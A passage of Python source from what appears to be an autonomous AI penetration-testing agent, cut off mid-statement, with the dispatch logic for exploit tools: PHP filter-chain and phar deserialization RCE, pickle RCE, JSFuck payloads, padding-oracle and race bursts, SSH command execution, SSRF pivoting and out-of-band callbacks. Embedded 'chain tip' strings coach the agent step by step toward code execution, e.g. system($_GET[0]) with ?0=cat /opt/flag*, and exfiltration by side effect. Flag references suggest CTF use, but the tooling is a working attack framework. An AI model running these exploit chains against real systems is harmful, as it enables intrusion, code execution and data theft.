            # lead must ride the response itself (salience > doctrine)
            filter_txt = ""
            if _looks_filtered(r.text):
                if r.status_code == 400 and "?" in url:
                    filter_txt = await self._filter_followup(url)
                if _named_char(r.text):
                    # per-character rejection: map the blacklist ONCE and
                    # name the technique — the 200-status filter page is
                    # indistinguishable from success without this
                    from urllib.parse import parse_qsl, urlsplit
                    _p = urlsplit(url)
                    _cand = [k for k, _ in parse_qsl(_p.query,
                                                     keep_blank_values=True)]
                    if not _cand and isinstance(body, str) and "=" in body:
                        try:
                            _cand = list(dict(parse_qsl(
                                body, keep_blank_values=True)))[:1]
                        except Exception:  # noqa: BLE001
                            _cand = []
                    if _cand:
                        filter_txt += (("\n" if filter_txt else "") +
                                       await self._blacklist_map(
                                           method, url, body, headers,
                                           _cand[0]))
            # chain-shape fingerprints → one-shot tool tips riding the
            # response (agents see the sink shape but not the doctrine)
            chain_hint = ""
            try:
                _low = (r.text or "")[:20000].lower()
                _seen = getattr(self.state, "_chain_hints_seen", None)
                if _seen is None:
                    _seen = self.state._chain_hints_seen = set()
                _priv_re = getattr(self.state, "_priv_hits", None)
                if _priv_re is None:
                    import re as _re2
                    _priv_re = self.state._priv_hits = {"n": 0,
                                                        "priv": 0}
                _priv_re["n"] += 1
                if _re2_priv := (url.startswith("http://172.")
                                 or url.startswith("http://10.")
                                 or url.startswith("http://192.168.")):
                    _priv_re["priv"] += 1
                if ("pivot" not in _seen and _priv_re["n"] > 25
                        and _priv_re["priv"] == 0
                        and any(r.startswith(("172.", "10.",
                                              "192.168."))
                                for r in getattr(self.guard, "rules",
                                                 []))):
                    _seen.add("pivot")
                    chain_hint += (
                        "── chain tip ── 25+ requests and NONE to the "
                        "internal backend IPs your scope lists — the "
                        "external hop is a proxy/funnel you cannot win "
                        "through. Hit the backend container IP:PORT "
                        "(or its forwarded 127.0.0.1:<non-web-port> "
                        "alias) DIRECTLY with your real params.")
                # sibling-coverage sweep: listing responses name resources
                # whose siblings imply more endpoints (Device Name: x →
                # /<base>/x/status). The LLM sees a TRUNCATED excerpt and
                # misses names near the end of long listings — this runs on
                # the FULL body server-side and names what was skipped.
                if "sibcov" not in _seen and r.status_code == 200:
                    import re as _re3
                    _names = set(_re3.findall(
                        r"(?:Device Name|Device|Resource|Service|Endpoint"
                        r"|Item|Module|Sensor|Task|name|Name|id|key)"
                        r"\s*[:=]\s*[\"']?([A-Za-z][A-Za-z0-9_.-]{1,28})"
                        r"[\"']?", r.text or ""))
                    _names -= {"GET", "POST", "http", "https", "true",
                               "false", "null"}
                    if len(_names) >= 4:
                        _st = getattr(self.state, "_sib", None)
                        if _st is None:
                            _st = self.state._sib = {"names": {},
                                                     "probed": set(),
                                                     "calls": 0}
                        _base = url.split("?")[0].rsplit("/", 1)[0]
                        for _nm in list(_names)[:30]:
                            _st["names"].setdefault(_nm, _base)
                        _st["calls"] += 1
                        for _nm in _st["names"]:
                            if _nm in url:
                                _st["probed"].add(_nm)
                        _unp = [n for n in _st["names"]
                                if n not in _st["probed"]]
                        _pr = _st["probed"]
                        if _pr and _unp and _st["calls"] >= 4:
                            _seen.add("sibcov")
                            _prio = sorted(
                                _unp,
                                key=lambda n: not any(
                                    s in n.lower() for s in (
                                        "flag", "secret", "token", "key",
                                        "admin", "cred", "password")))
                            chain_hint += (
                                "── chain tip ── a listing response named "
                                f"{len(_st['names'])} resources "
                                f"({len(_pr)} probed). UNPROBED siblings: "
                                f"{', '.join(_prio[:6])}. Response excerpts "
                                "TRUNCATE long listings — the tail entries "
                                "may be invisible to you but were seen "
                                "server-side. Probe EVERY sibling with the "
                                "same route shape (/<base>/<name>/status"
                                " etc.) before moving on.")
                if method == "POST" and r.status_code == 200:
                    _inv = getattr(self.state, "_post_invariance", None)
                    if _inv is None:
                        _inv = self.state._post_invariance = {}
                    import hashlib as _hl
                    _dg = _hl.md5((r.text or "").encode(
                        "latin-1", "replace")).hexdigest()
                    _ukey = url.split("?")[0]
                    _prev = _inv.get(_ukey)
                    _fired = False
                    if _prev and _prev[0] == _dg:
                        _inv[_ukey] = (_dg, _prev[1] + 1)
                        if ("funnelwall" not in _seen
                                and _prev[1] + 1 >= 3):
                            _seen.add("funnelwall")
                            _fired = True
                    else:
                        _inv[_ukey] = (_dg, 1)
                    if _fired:
                        chain_hint = (
                        "── chain tip ── 3+ POSTs to this URL returned "
                        "BYTE-IDENTICAL 200 bodies regardless of your "
                        "params: your parameters never reached the code "
                        "— either this hop fixes/ignores the body it "
                        "forwards (nginx/proxy with a canned body = SSRF "
                        "funnel) or the reader never sees them. Stop "
                        "retrying param variants on this hop NOW — pivot "
                        "DIRECTLY to the OTHER in-scope endpoints of this "
                        "target's stack (the internal-service ports your "
                        "scope/goal lists — 127.0.0.1:<non-web-port> or "
                        "172.x/10.x entries): send the REAL body there "
                        "(your form params as the POST body).")
                if any(s in (getattr(self, "goal", "") or "").lower()
                       for s in ("deserializ", "phar", "unserializ")):
                    _pf = "phar" not in _seen
                    _rearm = (self.iterations > 0
                              and self.iterations % 15 == 0
                              and not getattr(self.state, "_phar_built",
                                              False))
                    if _pf or (_rearm and "phar2" not in _seen):
                        _seen.add("phar")
                        if self.iterations > 0:
                            _seen.add("phar2")
                        chain_hint = (
                            "── chain tip ── the mission text names "
                            "DESERIALIZATION as the vuln class: find the "
                            "endpoint that ACCEPTS serialized/phar data — it "
                            "is almost always a POST param (data/file/"
                            "payload/token), and a GET rarely triggers the "
                            "sink. POST a benign marker first to learn the "
                            "param shape, then build the real payload with "
                            "the phar_rce tool (never hand-forge the "
                            "archive). The documented endpoint list on a "
                            "service index is NEVER the full list: fetch "
                            "the source-disclosure paths — /backup/"
                            "backup.zip (zip files sit INSIDE the backup "
                            "dir — the root-level /backup.zip is a 404, "
                            "always try the subpath), /.git/config, "
                            "/vendor/composer/installed.json — fetched "
                            "with a PLAIN GET directly on the service's "
                            "own origin (never through an SSRF funnel — "
                            "a fixed-body funnel cannot fetch for you). "
                            "Disclosed "
                            "PHP source names the real read/unserialize "
                            "endpoint AND the gadget class. When the "
                            "uploader returns a landed file_path, replay it "
                            "VERBATIM into that reader (no phar:// prefix "
                            "— the reader adds it). COMPLETE THE ROUND-"
                            "TRIP before detouring: (1) upload phar_b64 "
                            "through the documented blob param; (2) read "
                            "the response for the landed server-side "
                            "path; (3) POST that path verbatim to the "
                            "disclosed reader; (4) look for your marker "
                            "in the reader output. While the phar gadget "
                            "is in hand, scheme-bypass file reads "
                            "(compress.zlib://, php://filter) are a "
                            "DETOUR — the phar IS the read primitive.")
                if ("phar" in _low or "unserialize" in _low
                        or "file_path" in _low) and "phar" not in _seen:
                    _seen.add("phar")
                    chain_hint = (
                        "── chain tip ── body shows a planted-file/phar:// "
                        "READ shape: sweep source disclosure NOW (/backup/, "
                        "*.zip, /.git/, composer.json) for the gadget class, "
                        "then call the phar_rce tool (never hand-forge the "
                        "archive). If an SSRF funnels you here with a fixed "
                        "POST body: query string only helps $_GET/$_REQUEST "
                        "readers — a $_POST reader NEVER sees it; go hit the "
                        "backend container IP directly with a real body "
                        "(unpublished ports are reachable from the docker "
                        "bridge vantage; scan all in-scope 172.x IPs).")
                if ("invalid object type" in _low
                        and "ivt" not in _seen):
                    _seen.add("ivt")
                    chain_hint += (
                        " ── chain tip ── the reader's instanceof check "
                        "names the EXACT class it accepts (and the "
                        "var_dump above shows the class you sent): rebuild "
                        "the phar_rce payload with class_name set to the "
                        "class the source DEFINES (the class name inside "
                        "the disclosed file, not the FILE name), re-upload, "
                        "and feed the fresh file_path back VERBATIM.")
                if ("fc2" not in _seen and method == "POST"
                        and "/plugins/" in url.lower()
                        and r.status_code == 200
                        and 0 < len(r.text or "") < 200):
                    _seen.add("fc2")
                    chain_hint += (
                        "── chain tip ── POST to a plugin endpoint returning "
                        "a tiny CONSTANT body = browser/early-exit branch "
                        "taken BEFORE the include: resend the SAME request "
                        "with content-browser: true added (lowercase) — "
                        "that flag makes the script reach the include; "
                        "without it every payload variant silently "
                        "returns the same stub. Also keep the command on "
                        "the POST's own ?0= query string.")
                strong_fc = ("getallheaders" in _low
                             or "require_once($" in _low
                             or "include($" in _low
                             or "failed opening" in _low
                             or "failed to open stream" in _low)
                weak_fc = "wp-content/plugins/" in url.lower()
                if strong_fc or (weak_fc and "fc" not in _seen):
                    if weak_fc and not strong_fc:
                        _seen.add("fc")
                    chain_hint += ("── chain tip ── include/require shape "
                                   "fingerprinted: call the filter_chain tool"
                                   " (code=system($_GET[0]); — short, "
                                   "header-budget-safe), then in the http "
                                   "call set the carrying header value to "
                                   "\"@filter:system($_GET[0]);|<resource>\" "
                                   "— the tool expands it into the full "
                                   "chain URL itself (never hand-copy a 5KB "
                                   "chain; one typo = silent dead chain) "
                                   "and pass its URL as "
                                   "the include path — params ignored by a "
                                   "standalone plugin file usually arrive "
                                   "via request HEADERS, sent ALL-LOWERCASE "
                                   "(content-dir: <chain>, method POST, and "
                                   "content-browser: true MANDATORY — its "
                                   "absence makes browser-mode scripts exit "
                                   "BEFORE the include; every silent 200 "
                                   "means the branch never ran). Put the "
                                   "real command in the QUERY STRING ON "
                                   "THE POST'S OWN URL "
                                   "(POST .../endpoint.php?0=cat+/opt/flag*) "
                                   "— system($_GET[0]) reads THAT request's "
                                   "query, not a later GET's; output comes "
                                   "back at "
                                   "the START of the body. If truly blind, "
                                   "verify with code=touch('/tmp/x'); then "
                                   "exfil by side effect (copy flag into "
                                   "webroot CWD, GET it). 'Class X not "
                                   "found' in the error log = the chain RAN.")
                if ("formbody" not in _seen
                        and "?" in url
                        and ('method="post"' in _low
                             or "method='post'" in _low)):
                    _seen.add("formbody")
                    chain_hint += (
                        "── chain tip ── the page carries a POST form and "
                        "your params rode the QUERY STRING: a server field "
                        "read via request.form/$_POST NEVER sees ?x= — "
                        "resend the exact same params as an "
                        "x-www-form-urlencoded POST BODY (reflection "
                        "vanished => channel, not payload, is wrong).")
            except Exception:  # noqa: BLE001
                pass
            return _short(f"HTTP/1.1 {r.status_code} {r.reason_phrase}\n"
                          f"{hdr_txt}\n\n{r.text}"
                          + (f"\n\n{redir_txt}" if redir_txt else "")
                          + (f"\n\n{cookie_txt}" if cookie_txt else "")
                          + (f"\n\n{link_txt}" if link_txt else "")
                          + (f"\n\n{filter_txt}" if filter_txt else "")
                          + (f"\n\n{chain_hint}" if chain_hint else ""), 8000)

        if name == "raw_socket":
            from ..tools.raw_socket import raw_socket
            out = await raw_socket(
                self.guard, args["host"], int(args["port"]),
                sends=args["sends"],
                gap_seconds=float(args.get("gap_seconds", 1.0)),
                read_seconds=float(args.get("read_seconds", 4.0)))
            st.observe(json.dumps(out)[:600])
            if not out.get("ok"):
                return json.dumps(out)
            return _short(f"raw_socket {out['host']}:{out['port']} "
                          f"sent={out['sent']} received={out['received']}"
                          f"\n\n{out['transcript']}", 8000)

        # ---- ssh_exec (credential replay / file read on SSH) -------------
        if name == "ssh_exec":
            from ..tools.ssh_exec import ssh_exec_async
            port = int(args.get("port") or 22)
            out = await ssh_exec_async(self.guard, host=args["host"],
                                       port=port,
                                       username=args["username"],
                                       password=args.get("password", ""),
                                       key_path=args.get("key_path", ""),
                                       command=args.get("command",
                                                        "id; hostname"))
            st.log_request(
                "SSH",
                f"ssh://{args['host']}:{port} "
                f"{args.get('username', '')}$ {args.get('command', '')[:120]}",
                200 if out.get("ok") else 0, tool="ssh_exec")
            st.observe(json.dumps(out))
            return json.dumps(out, indent=1)

        # ---- file_ops (download + offline inspect) -----------------------
        if name == "http_save":
            from ..tools.file_ops import http_save
            url = args["url"]
            self.guard.check_url(url)
            await self.rl.acquire(url)
            default = re.sub(r"[^A-Za-z0-9._-]+", "_",
                             url.split("/")[-1] or "artifact")[:120]
            out = await asyncio.to_thread(
                http_save, self.guard, url,
                args.get("name") or default,
                str(self.state.dir / "artifacts"))
            st.log_request("GET", url, 200 if out.get("ok") else 0,
                           tool="http_save")
            return json.dumps(out, indent=1)

        if name in ("file_inspect", "read_file"):
            from ..tools import file_ops
            fn = file_ops.file_inspect if name == "file_inspect" \
                else file_ops.read_file
            out = await asyncio.to_thread(fn, args["path"])
            st.log_request(name.upper(), args["path"],
                           200 if out.get("ok") else 0, tool=name)
            st.observe(json.dumps(out)[:4000])
            return _short(json.dumps(out, indent=1), 12000)

        if name == "filter_chain":
            from ..exploit.filterchain import filter_chain_url
            url = filter_chain_url(args["code"],
                                   wrap=bool(args.get("wrap", True)),
                                   resource=args.get("resource", "php://temp"))
            out = {"ok": True, "filter_url": url,
                   "len": len(url),
                   "note": "BEST: do NOT copy this long string — in the "
                           "http tool, set the carrying header value to "
                           "\"@filter:<php-code>|<resource>\" (e.g. "
                           "\"content-dir\": \"@filter:system($_GET[0]);|"
                           "/var/www/html/wp-content/plugins/<slug>/\") and "
                           "the tool expands it to this exact URL with ZERO "
                           "copy-corruption risk. Manual use: pass this "
                           "string EXACTLY as the include/require parameter "
                           "(or the controllable prefix). Output of your "
                           "echo/system() code appears in the HTTP response "
                           "or error log."}
            if "$_GET[0]" in args["code"] or "$_GET['0']" in args["code"]:
                out["SEND_RECIPE"] = (
                    "the code reads its command from the QUERY STRING of "
                    "the SAME request that carries the filter URL — the "
                    "command MUST be on THAT request's own URL. Shape: "
                    '{"method": "POST", "url": "<target-endpoint>'
                    '?0=cat%20/opt/flag.txt", "headers": {<the header '
                    "that carries filter_url>: \"<filter_url>\"}} — the ?0= "
                    "goes on the POST's URL, NOT on some later GET. "
                    "Every execution without ?0= on the request URL runs "
                    "system() on an EMPTY argument and looks like a dead "
                    "chain.")
            out["HEADER_CHECKLIST"] = (
                "when the filter travels via request HEADERS to a WordPress"
                "/plugin endpoint: header names ALL-LOWERCASE "
                "(content-dir: — capitalization has empirically broken "
                "these chains), AND content-browser: true on the same "
                "request when the endpoint has a browser/early-exit "
                "branch — its absence makes the script EXIT BEFORE the "
                "include: the response is a tiny CONSTANT body with the "
                "connection closing right after headers. That constant-"
                "tiny-body signature = the gate is missing, NOT the chain "
                "being wrong.")
            return _short(json.dumps(out, indent=1), 12000)

        if name == "phar_rce":
            self.state._phar_built = True
            from ..exploit.phar import phar_rce_b64
            b64 = phar_rce_b64(args["code"],
                               args.get("class_name", "CustomTemplate"),
                               args.get("data_prop", "data"),
                               args.get("member", "manifest"),
                               args.get("extra_props"))
            out = {"ok": True, "phar_b64": b64,
                   "bytes": len(b64) * 3 // 4,
                   "member": args.get("member", "manifest"),
                   "note": "POST phar_b64 through the write primitive "
                           "(base64 blob field); the endpoint returns the "
                           "landed file_path — feed THAT path to the "
                           "phar:// reader endpoint. CRITICAL: replay the "
                           "returned file_path string VERBATIM as the "
                           "reader's param — do NOT prepend phar:// and do "
                           "NOT append a member path; the server-side "
                           "reader builds phar://<path>/manifest itself, so "
                           "your re-prefixing makes it phar://phar://... and "
                           "the read fails. The reader is usually a "
                           "DIFFERENT endpoint than the uploader — its name "
                           "comes from disclosed source (read_*.php, "
                           "*_read.php, /backup/*.zip), not from the "
                           "uploader's docs. If the upload validates file "
                           "type, REBUILD with magic_prefix=jpg/gif/png/pdf "
                           "(leading magic bytes; phar:// still parses). No "
                           "PHP runtime needed. Before sending: verify "
                           "class_name is the CLASS DEFINED in the "
                           "disclosed source (grep 'class <Name>' inside "
                           "the file you read) — NOT the file's name, and "
                           "NOT the instanceof-checked name minus "
                           "spelling: a mismatch unserialize()s fine but "
                           "the instanceof gate rejects it (\"Invalid "
                           "object type\") and nothing executes."}
            return _short(json.dumps(out, indent=1), 12000)

        if name == "jsfuck":
            from urllib.parse import quote
            from ..exploit.jsfuck import (assert_pure, jsfuck_code,
                                          jsfuck_expr)
            code = args["code"].strip()
            try:
                payload = (f'";{jsfuck_code(code)}//'
                           if args.get("context", "string") != "expr"
                           else jsfuck_expr(code))
                assert_pure(payload)
                out = {"ok": True, "payload": payload, "length": len(payload),
                       "context": args.get("context", "string"),
                       "urlencoded": quote(payload, safe=""),
                       "note": "Submit verbatim as the parameter value — but "
                               "in a FORM body or query string send the "
                               "'urlencoded' field instead: the payload is "
                               "+-dense and a raw + reads as SPACE server-"
                               "side, silently breaking it ('TypeError: "
                               "setter of an unconfigurable property' in the "
                               "result = your payload got mangled, not wrong)."}
            except AssertionError as e:
                out = {"ok": False, "error": str(e),
                       "note": "code must be plain JS; the encoder bans "
                               "only [A-Za-z0-9<>] in the OUTPUT."}
            st.observe(json.dumps(out)[:600])
            return json.dumps(out)

        if name == "http_burst":
            import hashlib
            import time as _time
            reqs = list(args.get("requests") or [])
            if not reqs and args.get("template"):
                reqs = [args["template"]] * int(args.get("repeat") or 2)
            reqs = reqs[:24]
            if not reqs:
                return "ERROR: pass requests=[…] or template+repeat"
            urls = {r.get("url", "") for r in reqs}
            for u in urls:
                if u:
                    self.guard.check_url(u)
            host = httpx.URL(next(iter(urls))).host if urls else ""
            if host:
                await self.rl.acquire(
                    f"{next(iter(urls))}")  # one gate, then race
            async def _one(spec: dict):
                try:
                    dly = float(spec.get("delay_ms") or 0)
                    if dly > 0:
                        await asyncio.sleep(dly / 1000.0)
                    r = await self._client.request(
                        spec.get("method", "GET").upper(),
                        spec.get("url", ""),
                        headers=spec.get("headers") or {},
                        content=spec.get("body"))
                    body = r.text or ""
                    dig = hashlib.md5(
                        body[:2048].encode("latin-1", "replace")
                    ).hexdigest()[:8]
                    return {"status": r.status_code, "len": len(body),
                            "digest": dig, "head": body[:100]}
                except Exception as e:  # noqa: BLE001
                    return {"status": 0, "error": f"{type(e).__name__}: "
                                                  f"{e}"[:100]}
            t0 = _time.time()
            results = await asyncio.gather(*[_one(r) for r in reqs])
            groups: dict[tuple, list] = {}
            for res in results:
                key = (res.get("status"), res.get("digest"))
                groups.setdefault(key, []).append(res)
            st.log_request("BURST", f"{len(reqs)}x {host}",
                           200, tool="http_burst")
            summary = [f"fired {len(reqs)} in "
                       f"{round(_time.time()-t0, 2)}s — "
                       f"{len(groups)} distinct outcomes:"]
            for (status, dig), grp in sorted(
                    groups.items(), key=lambda kv: -len(kv[1]))[:6]:
                summary.append(
                    f"  {len(grp)}x HTTP {status} len={grp[0].get('len')} "
                    f"body[:100]={grp[0].get('head')!r}")
            _same = (len({(r.get("method", "GET").upper(),
                           r.get("url", "").split("?")[0]) for r in reqs})
                     == 1)
            _has_dly = any(r.get("delay_ms") for r in reqs)
            if _same and len(reqs) > 2:
                summary.append(
                    "NOTE: single-endpoint burst. For a RACE you need a "
                    "MIXED burst in ONE call — the write (login/mutate) at "
                    "delay_ms 0 + 2-4 reads of the protected endpoint "
                    "spread delay_ms 40..300 — see SESSION-STATE TOCTOU "
                    "doctrine. Repeating this same shape cannot hit a "
                    "verify-then-read window.")
            elif not _same and not _has_dly and len(reqs) > 3:
                summary.append(
                    "NOTE: mixed but SIMULTANEOUS. When the write endpoint "
                    "is slower (KDF/2FA/external call), its state change "
                    "lands AFTER all reads complete — add per-request "
                    "delay_ms to spread the reads across the write's "
                    "commit window (40..300ms).")
            else:
                _dvals = [float(r.get("delay_ms") or 0) for r in reqs]
                _pos = [(float(r.get("delay_ms") or 0),
                         r.get("method", "GET").upper(),
                         r.get("url", "")) for r in reqs]
                if (not _same and _dvals
                        and max(_dvals) < 40):
                    summary.append(
                        "NOTE: delays under 40ms are effectively "
                        "SIMULTANEOUS when the write side does KDF/hash "
                        "work (its commit lands 80-150ms out) — re-send "
                        "with the WRITE at delay_ms 0 and the READS "
                        "staggered 40/70/100/130/160/200.")
                _writed = [p for p in _pos
                           if p[1] == "POST"
                           and any(s in p[2].lower() for s in (
                               "login", "signin", "auth", "session",
                               "password"))]
                _readd = [p for p in _pos if p[1] == "GET"]
                if (not _same and _writed and _readd
                        and max(d for d, _, _ in _writed)
                        > min(d for d, _, _ in _readd)):
                    summary.append(
                        "NOTE: you DELAYED the write and fired the reads "
                        "early — for a verify-then-read race the write "
                        "must commit BETWEEN the target's two reads, so "
                        "INVERT: write (login/mutate POST) at delay_ms 0, "
                        "protected reads spread delay_ms 40..300.")
            out = "\n".join(summary)
            st.observe(out[:1000])
            return _short(out, 4000)

        if name == "pickle_rce":
            from ..exploit.pickles import pickle_rce_b64
            try:
                payload = pickle_rce_b64(args["cmd"],
                                         args.get("channel", "return"))
                out = {"ok": True, "payload": payload,
                       "note": "Submit as the cookie/param value; "
                               "channel=return renders cmd output "
                               "wherever the app shows the deserialized "
                               "value. If the output never appears in "
                               "any page you read: (1) run ONE sentinel "
                               "payload (cmd writes AVCISENTINEL via "
                               "setattr on the object class AND its "
                               "instances) then re-read the list/detail/"
                               "recent/API pages — the page that shows "
                               "the marker is your output channel; (2) "
                               "still nothing? use conditional crash: "
                               "cmd = \"cond and __import__('os')"
                               "._exit(1)\" with cond testing flag bytes "
                               "(startswith) — 500 vs 200 IS the "
                               "boolean oracle, walk the flag char by "
                               "char. A 500 after planting = the gadget "
                               "FIRED (good news, not failure)."}
            except Exception as e:  # noqa: BLE001
                out = {"ok": False, "error": f"{type(e).__name__}: {e}"}
            st.observe(json.dumps(out)[:600])
            return json.dumps(out)

        if name == "padding_oracle":
            from ..exploit.padoracle import padding_oracle_attack
            self.guard.check_url(args["url"])
            await self.rl.acquire(args["url"])
            try:
                res = await padding_oracle_attack(
                    self._client, args["url"],
                    cookie=args["cookie"],
                    data_field=args["data_field"],
                    data_value=args.get("data_value", "x"),
                    method=args.get("method", "POST"),
                    invalid_marker=args["invalid_marker"],
                    valid_marker=args.get("valid_marker"))
            except Exception as e:  # noqa: BLE001
                res = {"ok": False,
                       "error": f"{type(e).__name__}: {e}"}
            st.log_request("PADORACLE",
                           f"{args['url']} n={res.get('requests', 0)}",
                           200 if res.get("ok") else 0,
                           tool="padding_oracle")
            out = json.dumps(res)
            st.observe(out[:800])
            return _short(out, 4000)

        # ---- recon -------------------------------------------------------
        if name == "surface_recon":
            from ..recon.engine import run_recon, save_surface
            self.phase_label = "recon"
            model = await run_recon(args["domain"], self.s, self.guard)
            path = save_surface(model, self.state.dir)
            self._surface_path = path
            st.log_event("recon_done", domain=args["domain"],
                         summary=model.summary())
            self._hook("recon", model.summary())
            return f"RECON COMPLETE: {model.summary()}\nsaved: {path.name}"

        if name == "read_surface":
            if self._surface_path is None:
                cand = sorted(self.state.dir.glob("surface_*.json"))
                if not cand:
                    return "No SurfaceModel yet — run surface_recon first."
                self._surface_path = cand[-1]
            data = json.loads(self._surface_path.read_text(encoding="utf-8"))
            view = {
                "subdomains": data["subdomains"][:80],
                "live_hosts": [
                    {k: h.get(k) for k in ("url", "status", "title", "tech", "server")}
                    for h in data["live_hosts"][:80]
                ],
                "api_paths": data["api_paths"][:300],
                "params": data["params"][:40],
                "forms": data["forms"][:60],
                "secrets": data["secrets"][:60],
                "path_hits": data.get("path_hits", [])[:60],
                "takeover": data.get("takeover", [])[:20],
                "ports": data["ports"],
                "sourcemaps_open": data["sourcemaps_open"][:20],
                "pages_count": len(data.get("pages", [])),
            }
            return _short(json.dumps(view, indent=1), 14000)

        # ---- probes ------------------------------------------------------
        if name == "probe":
            pname = args["name"]
            url = args["url"]
            self.guard.check_url(url)  # uniform gate even for direct-post probes
            reg = DeepProbeKit.full_registry()
            fn = reg.get(pname)
            if fn is None:
                return (f"ERROR: unknown probe {pname}; known={_PROBE_NAMES}")
            await self.rl.acquire(url)
            # signature-based routing: every probe param maps from the tool
            # args by name — new probes need zero dispatch edits
            import inspect
            kwargs = {}
            for pname_arg, p in inspect.signature(fn).parameters.items():
                if pname_arg in ("self", "url"):
                    continue
                has_default = p.default is not inspect.Parameter.empty
                if pname_arg == "param" and not args.get("param"):
                    if not has_default:
                        return f"ERROR: probe {pname} needs 'param'"
                    continue   # optional param absent → keep probe default
                if pname_arg == "token":
                    kwargs[pname_arg] = args.get("token", "")
                else:
                    val = args.get(pname_arg)
                    if val is not None:   # never override probe defaults with None
                        kwargs[pname_arg] = val
            out = await fn(self.probes, url, **kwargs)
            host = httpx.URL(out.url).host
            self.rl.note_response(host, out.evidence.response_status)
            st.log_request("PROBE", out.url, out.evidence.response_status,
                           tool=pname)
            receipt = self.evidence.store(
                f"probe:{pname}:{out.url}",
                {"probe": pname, "url": out.url, "verdict": out.verdict.receipt(),
                 "evidence": out.evidence.receipt(), "note": out.note},
            )
            self._hook("tool", f"probe {pname} → {out.verdict.verdict}")
            return json.dumps({
                "probe": out.name, "url": out.url,
                "verdict": out.verdict.verdict, "reason": out.verdict.reason,
                "checks": out.verdict.checks,
                "evidence": out.evidence.receipt(),
                "artifact": receipt["artifact"], "sha256": receipt["sha256"],
                "note": out.note,
            }, indent=1)

        # ---- OOB ---------------------------------------------------------
        if name == "oob_create":
            content = (args.get("content") or "").strip()
            ch = await self.oob.create(content=content)
            self._hook("tool", f"oob channel {ch.plant_url}")
            note = ("inject into SSRF/XXE/blind-RCE payloads; then oob_poll"
                    if not content else
                    "serves YOUR content at this URL root — for include/"
                    "require bugs with a fixed suffix, append '?' to this "
                    "URL so the suffix lands in the query string "
                    "(RFI host); callbacks still land in oob_poll")
            return json.dumps({
                "plant_this_url": ch.plant_url,
                "note": note,
            }, indent=1)
        if name == "bridge_run":
            bname = args["name"]
            burl = args["url"]
            if bname not in BRIDGES:
                return f"ERROR: unknown bridge {bname}; known={sorted(BRIDGES)}"
            from httpx import URL as _U
            host = _U(burl).host or burl
            await self.rl.acquire(burl)
            res = await BRIDGES[bname](
                host if bname == "httpx" else burl, self.guard)
            self.rl.note_response(host, 200)
            st.log_request("BRIDGE", burl, 200 if res.ok else 0, tool=bname)
            receipt = self.evidence.store(
                f"bridge:{bname}:{burl}",
                {"tool": bname, "url": burl, "ok": res.ok,
                 "findings": res.findings[:50],
                 "summary": res.raw_summary[:1000], "error": res.error})
            self._hook("tool", f"bridge {bname} → "
                       f"{len(res.findings)} results")
            return json.dumps({
                "bridge": bname, "ok": res.ok, "error": res.error,
                "findings": res.findings[:50],
                "summary": res.raw_summary[:1500] or "",
                "artifact": receipt["artifact"], "sha256": receipt["sha256"],
                "note": "treat bridge findings as candidates — verify with "
                        "probes/http before add_finding (oracle discipline)",
            }, indent=1)

        if name == "http_replay":
            rows = load_captured(self.state.dir)
            matches = find_matches(rows, args["match"])
            if not matches:
                return (f"ERROR: no captured request matches {args['match']!r}"
                        " — check read_surface/mitm_import first")
            req = matches[-1]
            if args.get("method"):
                req.method = args["method"].upper()
            if args.get("headers"):
                req.headers.update(args["headers"])
            if args.get("body"):
                req.body = args["body"]
            if args.get("payload") and args.get("param"):
                req = inject_payload(req, args["param"], args["payload"])
            if args.get("as_identity"):
                hdrs = self.identities.headers_for(args["as_identity"])
                if not hdrs:
                    return (f"ERROR: identity {args['as_identity']} not "
                            "registered — call identity_pair first")
                req = inject_headers(req, hdrs)
            rp = Replayer(self.guard, self.rl, st.log_request)
            out = await rp.replay(self._client, req)
            host = httpx.URL(req.url).host
            self.rl.note_response(host, out["status"])
            return json.dumps(out, indent=1)

        if name == "mitm_import":
            from ..bridge.mitm import ingest_file, write_captured
            fpath = Path(args["file"])
            if not fpath.exists():
                return f"ERROR: capture file not found: {fpath}"
            res = ingest_file(fpath, self.guard)
            write_captured(self.state.dir, res.rows)
            st.log_event("mitm_import", file=str(fpath),
                         rows=len(res.rows), skipped=res.skipped_out_of_scope)
            self._hook("tool", f"mitm import {len(res.rows)} rows")
            return json.dumps({
                "imported": len(res.rows),
                "skipped_out_of_scope": res.skipped_out_of_scope,
                "parser": res.parser,
                "summary": res.summary()[:800],
                "note": "captured requests are now http_replay templates "
                        "(match=url substring); authenticated surfaces from "
                        "the proxy are prime idor_swap/mass_assignment "
                        "targets",
            }, indent=1)

        if name == "oob_poll":
            results = await self.oob.poll_all()
            total = sum(len(v) for v in results.values())
            st.log_event("oob_poll", hits=total)
            return json.dumps({
                "channels": len(results), "callbacks": total,
                "detail": results if total else "no callbacks yet",
            }, indent=1, default=str)[:6000]

        # ---- browser -----------------------------------------------------
        if name == "browser":
            action = args["action"]
            if action == "goto" and args.get("url"):
                await self.rl.acquire(args["url"])
            if action == "goto":
                out = await self.browser.goto(args["url"])
            elif action == "click":
                out = await self.browser.click(args["selector"])
            elif action == "fill":
                out = await self.browser.fill(args["selector"], args.get("value", ""))
            elif action == "eval":
                out = await self.browser.eval_js(args.get("expr", "document.title"))
            elif action == "content":
                out = await self.browser.content()
            elif action == "screenshot":
                path = args.get("path") or str(
                    self.state.dir / f"shot_{len(st.events):04d}.png")
                out = await self.browser.screenshot(path)
            elif action == "links":
                out = await self.browser.links()
            elif action == "forms":
                out = await self.browser.forms()
            else:
                out = f"ERROR: unknown browser action {action}"
            if action == "goto" and args.get("url"):
                st.log_request("GET", args["url"], None, tool="browser")
            return _short(str(out), 8000)

        # ---- dual identity -------------------------------------------------
        if name == "identity_pair":
            self.phase_label = "identity"
            res = await self.identities.ensure(
                args["target_origin"], args.get("signup_path", ""))
            st.log_event("identity_pair", target=args["target_origin"],
                         ok=bool(res.get("ok")), reused=bool(res.get("reused")))
            self._hook("tool", f"identity pair ok={res.get('ok')}")
            return json.dumps(res, indent=1)

        if name == "divergence_check":
            out = await self.identities.divergence_check(args["url"])
            st.log_event("divergence_check", url=args["url"],
                         divergent=bool(out.get("divergent")))
            return json.dumps(out, indent=1)[:8000]

        # ---- registration --------------------------------------------------
        if name == "register_account":
            self.phase_label = "register"
            self._hook("register", args["target_origin"])
            res = await self.reg.full_chain(
                target_origin=args["target_origin"],
                signup_path=args.get("signup_path", ""),
                verify_base=args.get("verify_base", ""),
                use_browser=bool(args.get("use_browser")),
            )
            st.log_event("registration", result=res.summary())
            self._hook("register",
                       f"ok={res.ok} activated={res.activated} {res.email}")
            return json.dumps({
                "ok": res.ok, "email": res.email, "activated": res.activated,
                "otp": res.otp, "verify_url": res.verify_url,
